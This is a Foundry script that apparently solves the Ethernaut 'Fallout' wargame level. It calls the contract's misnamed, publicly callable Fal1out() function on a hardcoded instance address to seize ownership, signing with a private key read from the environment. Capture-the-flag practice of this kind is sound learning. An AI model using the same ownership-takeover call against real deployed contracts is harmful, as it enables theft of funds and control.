// SPDX-License-Identifier: MIT
// pragma solidity ^0.8.0;
pragma solidity ^0.6.0;

import "../src/Fallout.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FalloutSolution is Script {

    Fallout public FalloutInstance = Fallout(payable(0x3564A1c3F9afDDA8D1c257B79711F9C8EB58Ff47));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        FalloutInstance.Fal1out();

        vm.stopBroadcast();
    }
}